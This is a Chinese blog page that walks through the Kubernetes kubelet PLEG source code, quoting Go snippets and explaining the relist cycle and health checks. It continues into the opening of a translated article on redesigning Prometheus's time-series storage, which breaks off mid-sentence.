结构体的具体实现，先分析一下 PodLifecycleEventGenerator 接口，这个接口在 pkg/kubelet/pleg/pleg.go 文件中定义，包含三个方法： 123456// PodLifecycleEventGenerator contains functions for generating pod life cycle events.type PodLifecycleEventGenerator interface { Start() Watch() chan *PodLifecycleEvent Healthy() (bool, error)} Start 启动 PLEG。 Watch 返回一个 channel，pod lifecycle events 会发送到这个 channel 里，kubelet 通过这个 channel 来获取事件，执行处理动作。 Healty 返回 PLEG 的健康状态。kubelet 通过这个函数判断 PLEG 是否健康。 我们再看看 pod lifecycle event 的定义，见 pkg/kubelet/pleg/pleg.go 文件： 12345678910111213141516171819202122232425262728// PodLifeCycleEventType define the event type of pod life cycle events.type PodLifeCycleEventType stringconst ( // ContainerStarted - event type when the new state of container is running. ContainerStarted PodLifeCycleEventType = &quot;ContainerStarted&quot; // ContainerDied - event type when the new state of container is exited. ContainerDied PodLifeCycleEventType = &quot;ContainerDied&quot; // ContainerRemoved - event type when the old state of container is exited. ContainerRemoved PodLifeCycleEventType = &quot;ContainerRemoved&quot; // PodSync is used to trigger syncing of a pod when the observed change of // the state of the pod cannot be captured by any single event above. PodSync PodLifeCycleEventType = &quot;PodSync&quot; // ContainerChanged - event type when the new state of container is unknown. ContainerChanged PodLifeCycleEventType = &quot;ContainerChanged&quot;)// PodLifecycleEvent is an event that reflects the change of the pod state.type PodLifecycleEvent struct { // The pod ID. ID types.UID // The type of the event. Type PodLifeCycleEventType // The accompanied data which varies based on the event type. // - ContainerStarted/ContainerStopped: the container name (string). // - All other event types: unused. Data interface{}} PodLifecycleEvent 结构保存着以下信息： ID: pod ID Type: 事件类型 PodLifecycleEventType 有以下几种： ContainerStarted: 容器状态变为 Running ContainerDied: 容器状态变为 Exited ContainerRemoved: 容器消失 PodSync: PLEG 中未使用 ContainerChanged: 容器状态变为 Unknown Data: 容器 ID（源码注释是 container name，应该是错误） PLEG 接口调用下面我们看看 kubelet 是在哪里使用 PodLifecycleEventGenerator 接口里的三个方法的。 启动kubelet 在 Run 函数中执行 Start，启动 PLEG。 12345678// Run starts the kubelet reacting to config updatesfunc (kl *Kubelet) Run(updates &lt;-chan kubetypes.PodUpdate) { // ... // Start the pod lifecycle event generator. kl.pleg.Start() kl.syncLoop(updates, kl)} 事件处理最后在 syncLoop 中执行 Watch，获取到这个关键的 channel plegCh，然后在 syncLoopIteration 函数中从 channel 中获取事件，进行处理。 12345678910111213141516171819202122232425// syncLoop is the main loop for processing changes. It watches for changes from// three channels (file, apiserver, and http) and creates a union of them. For// any new change seen, will run a sync against desired state and running state. If// no changes are seen to the configuration, will synchronize the last known desired// state every sync-frequency seconds. Never returns.func (kl *Kubelet) syncLoop(updates &lt;-chan kubetypes.PodUpdate, handler SyncHandler) { klog.Info(&quot;Starting kubelet main sync loop.&quot;) // The syncTicker wakes up kubelet to checks if there are any pod workers // that need to be sync'd. A one-second period is sufficient because the // sync interval is defaulted to 10s. syncTicker := time.NewTicker(time.Second) defer syncTicker.Stop() housekeepingTicker := time.NewTicker(housekeepingPeriod) defer housekeepingTicker.Stop() plegCh := kl.pleg.Watch() // ... for { // ... if !kl.syncLoopIteration(updates, handler, syncTicker.C, housekeepingTicker.C, plegCh) { break } // ... }} syncLoopIteration 是 kubelet 事件处理的核心函数，它的职责是从多个不同类型的 channel 中获取事件，然后分发给不同的 handler 去处理。 123456789101112131415161718192021222324252627282930313233// syncLoopIteration reads from various channels and dispatches pods to the// given handler.func (kl *Kubelet) syncLoopIteration(configCh &lt;-chan kubetypes.PodUpdate, handler SyncHandler, syncCh &lt;-chan time.Time, housekeepingCh &lt;-chan time.Time, plegCh &lt;-chan *pleg.PodLifecycleEvent) bool { select { case u, open := &lt;-configCh: // ... case e := &lt;-plegCh: if isSyncPodWorthy(e) { // PLEG event for a pod; sync it. if pod, ok := kl.podManager.GetPodByUID(e.ID); ok { klog.V(2).Infof(&quot;SyncLoop (PLEG): %q, event: %#v&quot;, format.Pod(pod), e) handler.HandlePodSyncs([]*v1.Pod{pod}) } else { // If the pod no longer exists, ignore the event. klog.V(4).Infof(&quot;SyncLoop (PLEG): ignore irrelevant event: %#v&quot;, e) } } if e.Type == pleg.ContainerDied { if containerID, ok := e.Data.(string); ok { kl.cleanUpContainersInPod(e.ID, containerID) } } case &lt;-syncCh: // ... case update := &lt;-kl.livenessManager.Updates(): // ... case &lt;-housekeepingCh: // ... } return true} configCh 负责获取 pod 配置更新事件。 syncCh 是一个定时器，定时获取 pod sync 事件，对需要的 pod 进行同步，默认是 1s。 housekeepingCh 也是一个定时器，定时获取 pod Cleanup 事件，对需要的 pod 进行清理，默认值是 2s plegCh 负责获取 pod lifecycle 事件 livenessManager.Updates 负责获取 liveness probe 事件 handler 是个事件处理接口 (SyncHandler)，获取到上面的时间后调用对应的事件处理方法，kubelet 主类本身默认实现了这个接口。 在这里我们只关心对 pod lifecycle 事件的处理：从代码上看，kubelet 收到 pod lifecycle 事件之后，首先判断事件类型是不是值得触发 pod 同步，如果是 ContainerRemoved，则忽略该事件。如果是其他事件，且 pod 信息还没有被删除，调用 HandlePodSyncs 产生 UpdatePod 事件，交给 kubelet pod Worker 进行异步更新。最后，如果是 ContainerDied 事件，为了防止退出容器堆积，会按照一定的策略移除已退出的容器。 健康检测kubelet 对 PLEG 模块的健康检测，通过 runtimeState 来管理，kubelet 在初始化 PLEG 后通过 addHealthCheck 将 klet.pleg.Healthy 健康监测方法注册至 runtimeState，runtimeState 定时调用 Healthy 方法检查 PLEG 的健康状态。参见 pkg/kubelet/kubelet.go： 12345func NewMainKubelet(...) (*Kubelet, error) { // ... klet.runtimeState.addHealthCheck(&quot;PLEG&quot;, klet.pleg.Healthy) // ...} addHealthCheck 实现在 pkg/kubelet/runtime.go 中： 12345func (s *runtimeState) addHealthCheck(name string, f healthCheckFnType) { s.Lock() defer s.Unlock() s.healthChecks = append(s.healthChecks, &amp;healthCheck{name: name, fn: f})} 然后在 syncLoop 中定时执行 runtimeErrors，这里 syncLoop 采用了简单的 backoff 机制，如果 runtimeState 各个模块状态都正常，则每次循环默认 sleep 100ms，如果出现异常状态，则 sleep duration * 2，最大变为 5s，参见 pkg/kubelet/kubelet.go： 12345678910111213141516171819202122func (kl *Kubelet) syncLoop(updates &lt;-chan kubetypes.PodUpdate, handler SyncHandler) { klog.Info(&quot;Starting kubelet main sync loop.&quot;) // ... const ( base = 100 * time.Millisecond max = 5 * time.Second factor = 2 ) duration := base for { if err := kl.runtimeState.runtimeErrors(); err != nil { klog.Infof(&quot;skipping pod synchronization - %v&quot;, err) // exponential backoff time.Sleep(duration) duration = time.Duration(math.Min(float64(max), factor*float64(duration))) continue } // reset backoff if we have a success duration = base // ... }} runtimeErrors 实现在 pkg/kubelet/runtime.go 中： 12345678910111213func (s *runtimeState) runtimeErrors() error { s.RLock() defer s.RUnlock() errs := []error{} // ... for _, hc := range s.healthChecks { if ok, err := hc.fn(); !ok { errs = append(errs, fmt.Errorf(&quot;%s is not healthy: %v&quot;, hc.name, err)) } } return utilerrors.NewAggregate(errs)} 这里也是依次执行各个模块事先注册的 healthy check 函数，如果任何一个模块返回 false，则认为整个 runtimeState 的状态为 unhealthy。 Generic PLEG 实现我们再回到 PodLifecycleEventGenerator 接口的实现 —— GenericPLEG 的定义，见 pkg/kubelet/pleg/generic.go 文件： 12345678910111213141516171819type GenericPLEG struct { // The period for relisting. relistPeriod time.Duration // The container runtime. runtime kubecontainer.Runtime // The channel from which the subscriber listens events. eventChannel chan *PodLifecycleEvent // The internal cache for pod/container information. podRecords podRecords // Time of the last relisting. relistTime atomic.Value // Cache for storing the runtime states required for syncing pods. cache kubecontainer.Cache // For testability. clock clock.Clock // Pods that failed to have their status retrieved during a relist. These pods will be // retried during the next relisting. podsToReinspect map[types.UID]*kubecontainer.Pod} relistPeriod 是 PLEG 检测周期，默认为 1s runtime 是 container runtime，负责获取 pod 和 container 的状态信息 podRecords 缓存 pod 以及 Container 的基本信息 cache 缓存 pod 的运行时状态 eventChannel 是 PLEG 通过对比 pod 缓存信息和当前信息，生成 pod lifecycle events 的 channel relistTime 是上一次执行完 PLEG 检测的时刻 podsToReinspect 保存 PLEG 检测失败的 Pod，以便下次再次检测 clock 是一个时间管理对象，作用是获取当前时间 然后我们基于接口方法，来分析 GenericPLEG 的实现： 1234// Start spawns a goroutine to relist periodically.func (g *GenericPLEG) Start() { go wait.Until(g.relist, g.relistPeriod, wait.NeverStop)} Start 启动了一个 goroutine，以 1s 的间隔无限执行 relist 函数。这里要注意 wait.Until 的行为，如果 relist 执行时间大于 period 设置的值，则时间窗会滑动至 relist 执行完毕的那一时刻。也就是说如果 period 是 1s，relist 从第 0s 开始，花了 10s，结束时是第 10s，那么下一次 relist 会从第 11s 开始执行。 relist 函数的实现如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114// relist queries the container runtime for list of pods/containers, compare// with the internal pods/containers, and generates events accordingly.func (g *GenericPLEG) relist() { klog.V(5).Infof(&quot;GenericPLEG: Relisting&quot;) if lastRelistTime := g.getRelistTime(); !lastRelistTime.IsZero() { metrics.PLEGRelistInterval.Observe(metrics.SinceInSeconds(lastRelistTime)) metrics.DeprecatedPLEGRelistInterval.Observe(metrics.SinceInMicroseconds(lastRelistTime)) } timestamp := g.clock.Now() defer func() { metrics.PLEGRelistDuration.Observe(metrics.SinceInSeconds(timestamp)) metrics.DeprecatedPLEGRelistLatency.Observe(metrics.SinceInMicroseconds(timestamp)) }() // Get all the pods. podList, err := g.runtime.GetPods(true) if err != nil { klog.Errorf(&quot;GenericPLEG: Unable to retrieve pods: %v&quot;, err) return } g.updateRelistTime(timestamp) pods := kubecontainer.Pods(podList) g.podRecords.setCurrent(pods) // Compare the old and the current pods, and generate events. eventsByPodID := map[types.UID][]*PodLifecycleEvent{} for pid := range g.podRecords { oldPod := g.podRecords.getOld(pid) pod := g.podRecords.getCurrent(pid) // Get all containers in the old and the new pod. allContainers := getContainersFromPods(oldPod, pod) for _, container := range allContainers { events := computeEvents(oldPod, pod, &amp;container.ID) for _, e := range events { updateEvents(eventsByPodID, e) } } } var needsReinspection map[types.UID]*kubecontainer.Pod if g.cacheEnabled() { needsReinspection = make(map[types.UID]*kubecontainer.Pod) } // If there are events associated with a pod, we should update the // podCache. for pid, events := range eventsByPodID { pod := g.podRecords.getCurrent(pid) if g.cacheEnabled() { // updateCache() will inspect the pod and update the cache. If an // error occurs during the inspection, we want PLEG to retry again // in the next relist. To achieve this, we do not update the // associated podRecord of the pod, so that the change will be // detect again in the next relist. // TODO: If many pods changed during the same relist period, // inspecting the pod and getting the PodStatus to update the cache // serially may take a while. We should be aware of this and // parallelize if needed. if err := g.updateCache(pod, pid); err != nil { // Rely on updateCache calling GetPodStatus to log the actual error. klog.V(4).Infof(&quot;PLEG: Ignoring events for pod %s/%s: %v&quot;, pod.Name, pod.Namespace, err) // make sure we try to reinspect the pod during the next relisting needsReinspection[pid] = pod continue } else if _, found := g.podsToReinspect[pid]; found { // this pod was in the list to reinspect and we did so because it had events, so remove it // from the list (we don't want the reinspection code below to inspect it a second time in // this relist execution) delete(g.podsToReinspect, pid) } } // Update the internal storage and send out the events. g.podRecords.update(pid) for i := range events { // Filter out events that are not reliable and no other components use yet. if events[i].Type == ContainerChanged { continue } select { case g.eventChannel &lt;- events[i]: default: metrics.PLEGDiscardEvents.WithLabelValues().Inc() klog.Error(&quot;event channel is full, discard this relist() cycle event&quot;) } } } if g.cacheEnabled() { // reinspect any pods that failed inspection during the previous relist if len(g.podsToReinspect) &gt; 0 { klog.V(5).Infof(&quot;GenericPLEG: Reinspecting pods that previously failed inspection&quot;) for pid, pod := range g.podsToReinspect { if err := g.updateCache(pod, pid); err != nil { // Rely on updateCache calling GetPodStatus to log the actual error. klog.V(5).Infof(&quot;PLEG: pod %s/%s failed reinspection: %v&quot;, pod.Name, pod.Namespace, err) needsReinspection[pid] = pod } } } // Update the cache timestamp. This needs to happen *after* // all pods have been properly updated in the cache. g.cache.UpdateTime(timestamp) } // make sure we retain the list of pods that need reinspecting the next time relist is called g.podsToReinspect = needsReinspection} relist 中 export 了两个监控指标：relist_interval 和 relist_latency，它们俩的关系是： 1relist_interval = relist_latency + relist_period 整个 relist 的流程大致为： 从 container runtime 获取所有 Pod，更新至 podRecords 的 current state 遍历 podRecords，对比 current state 和 old state，产生 lifecycle events 并按照 pod 分组 遍历 pod 和 对应的 events，从 container runtime 获取 pod status 更新 cache（记录失败的 Pod，准备下次重试），并将 PLEG event （除了 ContainerChanged 事件）放入 eventChannel 遍历上次 relist 更新 cache 失败的 Pod，尝试再次获取 pod status 更新 cache relist 函数通过访问 container runtime 将 pod 和 container 的实际状态更新至 kubelet 的 pod cache。其他模块 (pod worker) 使用的 pod cache，都由 PLEG 模块更新。 pod lifecycle event 的生成通过 generateEvents 函数比较 old state 和 new state 来实现： 12345678910111213141516171819202122232425func generateEvents(podID types.UID, cid string, oldState, newState plegContainerState) []*PodLifecycleEvent { if newState == oldState { return nil } klog.V(4).Infof(&quot;GenericPLEG: %v/%v: %v -&gt; %v&quot;, podID, cid, oldState, newState) switch newState { case plegContainerRunning: return []*PodLifecycleEvent{{ID: podID, Type: ContainerStarted, Data: cid}} case plegContainerExited: return []*PodLifecycleEvent{{ID: podID, Type: ContainerDied, Data: cid}} case plegContainerUnknown: return []*PodLifecycleEvent{{ID: podID, Type: ContainerChanged, Data: cid}} case plegContainerNonExistent: switch oldState { case plegContainerExited: // We already reported that the container died before. return []*PodLifecycleEvent{{ID: podID, Type: ContainerRemoved, Data: cid}} default: return []*PodLifecycleEvent{{ID: podID, Type: ContainerDied, Data: cid}, {ID: podID, Type: ContainerRemoved, Data: cid}} } default: panic(fmt.Sprintf(&quot;unrecognized container state: %v&quot;, newState)) }} 顺便看看 Container Runtime 接口，对于 Container Runtime，我们主要关注 PLEG 用到的两个方法 GetPods 和 GetPodStatus，参照 pkg/kubelet/container/runtime.go 文件： 123456789101112131415// Runtime interface defines the interfaces that should be implemented// by a container runtime.// Thread safety is required from implementations of this interface.type Runtime interface { // ... // GetPods returns a list of containers grouped by pods. The boolean parameter // specifies whether the runtime returns all containers including those already // exited and dead containers (used for garbage collection). GetPods(all bool) ([]*Pod, error) // ... // GetPodStatus retrieves the status of the pod, including the // information of all containers in the pod that are visible in Runtime. GetPodStatus(uid types.UID, name, namespace string) (*PodStatus, error) // ...} GetPods 主要是获取 pod 列表和 pod/container 的基本信息，GetPodStatus 则获取单个 pod 内所有容器的详细状态信息（包括 pod IP 和 runtime 返回的一些状态）。 关于事件通知，上面提到 PLEG 会将 pod lifecycle events 放入一个 channel，Watch 方法返回了这个 channel。 123456// Watch returns a channel from which the subscriber can receive PodLifecycleEvent// events.// TODO: support multiple subscribers.func (g *GenericPLEG) Watch() chan *PodLifecycleEvent { return g.eventChannel} 那么 PLEG 如何判断自己工作是否正常呢？通过暴露 Healthy 方法，GenericPLEG 保存了上一次开始执行 relist 的时间戳，Healthy 方法判断与当前时间的间隔，只要大于阈值，则认为 PLEG unhealthy。 12345678910111213// Healthy check if PLEG work properly.// relistThreshold is the maximum interval between two relist.func (g *GenericPLEG) Healthy() (bool, error) { relistTime := g.getRelistTime() if relistTime.IsZero() { return false, fmt.Errorf(&quot;pleg has yet to be successful&quot;) } elapsed := g.clock.Since(relistTime) if elapsed &gt; relistThreshold { return false, fmt.Errorf(&quot;pleg was last seen active %v ago; threshold is %v&quot;, elapsed, relistThreshold) } return true, nil} 这个阈值在 pkg/kubelet/pleg/generic.go 中定义： 123456const ( // The threshold needs to be greater than the relisting period + the // relisting time, which can vary significantly. Set a conservative // threshold to avoid flipping between healthy and unhealthy. relistThreshold = 3 * time.Minute) 默认是 3m，也就是说只要 relist 执行时间超过 3 分钟，则认为 PLEG unhealthy。 总结最后我们总结一下整个流程： kubelet 创建并启动 PLEG 模块，watch pod lifecycle event PLEG 模块每隔 1s 执行 relist，relist 完成两个目标： 获取 pod list，对比 pod 的 old state 和 new state，产生 PLEG events 依次获取 pod status，并更新 pod cache kubelet watch 到 pod lifecycle events，产生 update pod 事件通知 pod worker 执行 sync pod 操作 kubelet 持续检查 runtime state (PLEG) 的健康状态 本文对下面几个方面没有深入介绍，后面有空会写单独的文章将源码解析分享出来： kubelet sync loop iteration pod worker 的 sync pod 机制 container runtime node status 节点状态控制","link":"/hexo-blog/2019/06/04/Kubelet-PLEG-%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"},{"title":"从头编写一款时间序列数据库","text":"本文转自 从头编写一款时间序列数据库 （翻译：Colstuwjx），请支持原作者。 我从事监控方面的工作。尤其是专注在 Prometheus，一款内置了自己定制的时间序列数据库的监控系统，以及它和 Kubernetes 的集成工作。 从很多方面来说，Kubernetes 表现出了一切 Prometheus 专门设计的东西。它使得持续部署，自动扩缩，以及高度动态环境的其他功能更易于实现。它的查询语言和操作模型，还有许多其他概念方面的决策使得 Prometheus 尤其适合这样的环境。然而，如果被监控的工作负载变得更加显著动态的话，这也会给监控系统本身带来新的压力。基于这一点的考虑，与其再次回顾 Prometheus 已经很好解决的问题，还不如专注于在这样一个高度动态或短生命周期服务的环境里提高它的性能。 Prometheus 的存储层在历史上有着惊人的性能表现，一个单台服务器每秒可以摄取多达 100 万个采样，数百万个时间序列，同时仅占用令人惊叹的少量磁盘空间。尽管当前的存储已经给我们提供了不错的服务，笔者构思了一个新设计的存储子系统用来纠正现有解决方案的一些短板，并且可以用来配备支撑下一代的集群规模。 注意：笔者并没有数据库方面的背景。我在这里所说的话可能是错误的或是带有误导性的。你可以在 Freenode 上的 #prometheus 频道里将你的批评指正反馈到我（fabxc）。 问题，难题，问题域首先，快速概括一下我们试图完成的任务以及这里面暴露出的关键问题。针对每一点，我们会先看一看 Prometheus 目前的做法，它在哪些地方做的出色，以及我们旨在通过新的设计想解决哪些问题。 时间序列数据我们有一个根据时间采集数据点的系统。 1identifier -&gt; (t0, v0), (t1, v1), (t2, v2), (t3, v3), .... 每个数据点都是一个由时间戳和值组成的元组。为了达成监控的目的，时间戳是一个整数，值则可以是任意数字。经验来看，一个64位的浮点数往往能够很好地展现计数器（counter）和测量（gauge）的值，因此我们也不例外。一个时间序列是一组时间上严格单调递增的数据点序列，它可以通过一个标识符来寻址。我们的标识符便是一个度量（metric）名带上一个多维标签的字典。多维标签会将单个度量的测量空间分区。每个度量名加上一串唯一的标签便组成了它自己的时间序列（time series），它会有一个与之关联的值序列流。下面是一组典型的序列标识符，它是度量请求计数的一部分： 123requests_total{path=&quot;/status&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.1:80&quot;}requests_total{path=&quot;/status&quot;, method=&quot;POST&quot;, instance=&quot;10.0.0.3:80&quot;}requests_total{path=&quot;/&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.2:80&quot;} 让我们快速简化一下这个表达形式：我们不妨将一个度量名视为另一种标签维度 - 在我们的场景里便是 __name__。在查询级别上，它可能会被特殊对待，但是它并不会关注我们采用何种方式来存放它，这一点我们将在后面看到。 123{__name__=&quot;requests_total&quot;, path=&quot;/status&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.1:80&quot;}{__name__=&quot;requests_total&quot;, path=&quot;/status&quot;, method=&quot;POST&quot;, instance=&quot;10.0.0.3:80&quot;}{__name__=&quot;requests_total&quot;, path=&quot;/&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.2:80&quot;} 当查询时间序列数据时，我们想通过指定标签来选择。最简单的例子莫过于 {__name__=&quot;requests_total&quot;} 会选出所有属于 requests_total 度量的序列。针对所有被选中的序列来说，我们会在一个指定的时间窗口里检索出对应的数据点。 而在更复杂的查询里，我们可能希望同时选择满足多个标签选择器的序列，并且就表达形式来说也会存在比等于更复杂的条件。比如，取反（method!=&quot;GET&quot;）或者正则表达式匹配（method=~&quot;PUT|POST&quot;）。 这大体上决定了所需存储的数据以及它们该如何被调用。 横轴和纵轴在一个简化的视图中，所有数据点都可以在一个二维平面上分布。横轴代表时间，而序列标识符的空间遍及整个纵轴。 1234567891011121314series ^ │ . . . . . . . . . . . . . . . . . . . . . . {__name__=&quot;request_total&quot;, method=&quot;GET&quot;} │ . . . . . . . . . . . . . . . . . . . . . . {__name__=&quot;request_total&quot;, method=&quot;POST&quot;} │ . . . . . . . │ . . . . . . . . . . . . . . . . . . . ... │ . . . . . . . . . . . . . . . . . . . . . │ . . . . . . . . . . . . . . . . . . . . . {__name__=&quot;errors_total&quot;, method=&quot;POST&quot;} │ . . . . . . . . . . . . . . . . . {__name__=&quot;errors_total&quot;, method=&quot;GET&quot;} │ . . . . . . . . . . . . . . │ . . . . . . . . . . . . . . . . . . . ... │ . . . . . . . . . . . . . . . . . . . . v &lt;-------------------- time ---------------------&gt; Prometheus 通过定期抓取一组时间序列的当前值来检索得到数据点。这样一个我们检索批次的实体被称作一个目标（target）。由于每个目标的样本数据都是单独抓取的，因此写入模式是完全垂直并且高度并发的。这里提供一些衡量尺度：一个单个的Prometheus实例会从成千上万的目标采集数据点，每个目标可以暴露出数百上千个不同的时间序列。 就每秒采集数百万个数据点的规模而言，批量写入是一个不可调和的性能需求。分散地写入单个数据点到磁盘的话又会是一个非常缓慢的过程。因此，我们想要实现的是按顺序写入更大的数据块。对于机械的旋转磁盘而言这样做并不出奇，因为它们的头会一直物理地移动到不同的区块。虽然 SSD 以快速地随机写入性能而闻名，但是实际上它们却不能修改单个字节，而只能写入 4KiB 或更大的的页。这意味着写一个 16 字节的样本同写一个完整的 4KiB 页没什么两样。这种行为即是所谓的写入放大的一部分，作为一个“额外红利”，它会耗损你的 SSD —— 因此它不仅仅只是会变慢而已，还会在几天或者几周内完全毁掉你的硬件。关于这个问题的更详细信息，系列博客”针对 SSD 编程“系列会是一个不错的资源。我们不妨考虑一下这里面的主要关键点：顺序和批量写入是旋转磁盘和 SSD 的理想写入模式。 这是一个应该遵循的简单规则。 时间序列数据库的查询模型跟写模型相比，更是有明显不同的区别。我们可以对一个单个序列查询一个单个的数据点，在 10000 个序列里查询一个单个的数据点，在一个单个序列里查询几周的数据点，甚至在 10000 个序列里查询几周的数据点，等等。因此在我们的二维平面上，查询既不是完全垂直的，也不是水平的，而是二者的矩形组合。记录规则可以减轻已知的一些查询方面的问题，但是仍然不是临时查询（ad-hoc queries）的一个通用解决方案，这些查询也必须能很好的进行下去。 须知我们想要的是批量写入，但是我们得到的批次只是序列之间一个纵向的数据点集合。当在一个时间窗口上针对某个序列查询数据点时，不仅难以确定各个数据点可以被找到的位置，我们还不得不从磁盘上大量的随机位置进行读取。每次查询操作可能涉及到数以百万的样例数据，即使在最快的 SSD 上这样的操作也会变慢。读操作还将从磁盘上检索更多的数据，而不仅仅只是所请求的 16 字节大小的样本。 SSD 将加载一整页，HDD 将至少读取整个扇区。 无论哪种方式，我们都会浪费宝贵的读吞吐量。 因此，在理想情况下，相同序列的样本数据将会被顺序存储，这样一来我们便可以用尽可能少的读来扫描得到它们。 在上层，我们只需要知道这个序列可以访问的所有数据点的开始位置。 在将收集的数据写入磁盘的理想模式和为服务的查询操作提供更显著有效的存储格式之间显然存在着强烈的冲突。这是我们的时间序列数据库要解决的根本问题。 当前的解决方案是时候来看看 Prometheus 当前的存储是如何实现的，我们不妨叫它“V2”，它致力于解决这个问题。我们会为每个时间序列创建一个文件，它会按照时间顺序包含所有的样本数据。由于每隔几秒就把单个的样本数据添加到所有这些文件的成本不小，我们针对每个序列在内存里批量存放了 1KiB 的数据块，一旦它们填满了再把这些块添加到一个个的文件里。这一方案解决了很大一部分问题。写操作如今是分批次的，样本数据也是顺序存储的。它还能为我们提供一个令人难以置信的高效压缩格式，这是基于一个给定的样本相对于相同序列里前面的那些样本数据只有非常少量的变化这一属性而设计。Facebook 在它们的 Gorilla TSDB 的论文里描述了一种类似的基于块（Chunk）的存储方法，并且引入了一个压缩格式，将16个字节的样本减少到平均 1.37 字节。V2 存储使用了各种压缩格式，包括 Gorilla 的一个变种。 12345678 ┌──────────┬─────────┬─────────┬─────────┬─────────┐ series A └──────────┴─────────┴─────────┴─────────┴─────────┘ ┌──────────┬─────────┬─────────┬─────────┬─────────┐ series B └──────────┴─────────┴─────────┴─────────┴─────────┘ . . .┌──────────┬─────────┬─────────┬─────────┬─────────┬─────────┐ series XYZ└──────────┴─────────┴─────────┴─────────┴─────────┴─────────┘ chunk 1 chunk 2 chunk 3 ... 尽管基于块的实现方案很棒，如何为每个序列维护一个单独的文件却也是V2存储引擎困扰的地方，这里面有几个原因： 我们实际上需要维护的文件数量多于我们正在收集数据的时间序列数量。在“序列分流”一节会详解介绍到这点。由于产生了几百万个文件，不久的将来或者迟早有一天，我们的文件系统会出现 inodes 耗尽的情况。在这种情况下我们只能通过重新格式化磁盘来恢复，这样做可能带有侵入性和破坏性。通常我们都希望避免格式化磁盘，特别是需要适配某个单个应用时更是如此。 即便做了分块，每秒也会产生数以千计的数据块并且准备好被持久化。这仍然需要每秒完成几千次单独的磁盘写操作。尽管这一点可以通过为每个序列填满的数据块做分批处理来缓解压力，这反过来又会增加等待被持久化的数据总的内存占用。 保持打开所有文件来读取和写入是不可行的。特别是因为在24小时后超过99%的数据便不再会被查询。如果它还是被查询到的话，我们就不得不打开数千个文件，查找和读取相关的数据点到内存，然后再重新关闭它们。而这样做会导致很高的查询延迟，数据块被相对积极地缓存的话又会导致一些问题，这一点会在“耗用资源”一节里进一步概述。 最终，旧数据必须得被清理掉，而且数据需要从数百万的文件前面被抹除。这意味着删除实际上是写密集型操作。此外，循环地在这数百万的文件里穿梭然后分析它们会让这个过程常常耗费数个小时。在完成时有可能还需要重新开始。呵呵，删除旧文件将会给你的SSD带来进一步的写入放大！ 当前堆积的数据块只能放在内存里。如果应用崩溃的话，数据将会丢失。为了避免这种情况，它会定期地保存内存状态的检查点（Checkpoint）到磁盘，这可能比我们愿意接受的数据丢失窗口要长得多。从检查点恢复估计也会花上几分钟，造成痛苦而漫长的重启周期。 从现有的设计中脱颖而出的关键在于块的概念，我们当然希望保留这一设计。大多数最近的块被保留在内存里一般来说也是一个不错的做法。毕竟，最大幅度被查询数据里大部分便是这些最近的点。 一个时间序列对应一个文件这一概念是我们想要替换的。 序列分流 (Series Churn)在 Prometheus 的上下文里，我们使用术语“序列分流”来描述一组时间序列变得不活跃，即不再接收数据点，取而代之的是有一组新的活跃的序列出现。 举个例子，由一个给定的微服务实例产出的所有序列各自都有一个标识它起源的“instance”标签。如果我们对该微服务完成了一次滚动更新然后将每个实例切换到了一个更新的版本的话，序列分流就产生了。在一个更加动态的环境里，这些事件可能会以小时的频率出现。像Kubernetes这样的集群编排系统允许应用程序不断地自动伸缩和频繁的滚动更新，它可能会创建出数万个新的应用程序实例，并且每天都会使用全新的时间序列。 123456789101112131415series ^ │ . . . . . . │ . . . . . . │ . . . . . . │ . . . . . . . │ . . . . . . . │ . . . . . . . │ . . . . . . │ . . . . . . │ . . . . . │ . . . . . │ . . . . . v &lt;-------------------- time ---------------------&gt; 因此，即便整个基础设施大体上保持不变，随着时间的推移，我们数据库里的时间序列数据量也会呈线性增长。 尽管 Prometheus 服务器很愿意去采集 1000 万个时间序列的数据，但是如果不得不在十亿个序列中查找数据的话，很明显查询性能会受到影响。 当前解决方案Prometheus当前 V2 版本的存储针对当前被存放的所有序列都有一个基于 LevelDB 的索引。它允许包含一个指定的标签对来查询序列，但是缺乏一个可扩展的方式以组合来自不同标签选择的结果。举个例子，用户可以有效地选出带有标签 __name __ =&quot;requests_total&quot; 的所有序列，但是选择所有满足 instance=&quot;A&quot; AND __name __ =&quot;requests_total&quot; 的序列则都有可扩展性的问题。我们稍后会重新审视为什么会造成这样的结果，要改善查询延迟的话要做哪些必要的调整。 实际上这一问题正是触发要实现一个更好的存储系统的最初动力。Prometheus 需要一个改进的索引方法从数亿个时间序列里进行快速搜索。 耗用资源耗用资源是试图扩展 Prometheus（或者任何东西，真的）时不变的话题之一。但是实际上烦恼用户的问题并不是绝对的资源匮乏。实际上，由于给定需求的驱动，Prometheus 管理着令人难以置信的吞吐量。问题更在于是面对变化的相对未知性和不稳定性。由于V2存储本身的架构设计，它会缓慢地构建出大量的样本数据块，而这会导致内存消耗随着时间的推移不断增加。随着数据块被填满，它们会被写入到磁盘，随即便能够从内存中被清理出去。最终，Prometheus 的内存使用量会达到一个稳定的状态。直到受监控的环境发生变化 - 每次我们扩展应用程序或进行滚动更新时，序列分流 会造成内存，CPU 和磁盘 IO 占用方面的增长。 如果变更是正在进行的话，那么最终它将再次达到一个稳定的状态，但是比起一个更加静态的环境而言，它所消耗的资源将会显著提高。过渡期的时长一般长达几个小时，而且很难说最大资源使用量会是多少。 每个时间序列对应一个单个文件的方式使得单个查询很容易就击垮 Prometheus 的进程。而当所要查询的数据没有缓存到内存时，被查询序列的文件会被打开，然后包含相关数据点的数据块会被读取到内存里。倘若数据量超过了可用内存，Prometheus 会因为 OOM 被杀死而退出。待查询完成后，加载的数据可以再次释放，但通常会缓存更长时间，以便在相同数据上更快地提供后续查询。后者显然是一件好事。 最后，我们看下 SSD 上下文里的写入放大，以及 Prometheus 是如何通过批量写入来解决这个问题。然而，这里仍然有几处会造成写入放大，因为存在太多小的批次而且没有精确地对准页面边界。针对更大规模的 Prometheus 服务器，现实世界已经有发现硬件寿命缩短的情况。可能对于具有高写入吞吐量的数据库应用程序来说，这仍属正常，但是我们应该关注是否可以缓解这一情况。 从头开始如今，我们对我们的问题域有了一个清晰的了解，V2 存储是如何解决它的，以及它在设计上存在哪些问题。我们也看到一些很棒的概念设计，这些也是我们想要或多或少无缝适配的。相当数量的 V2 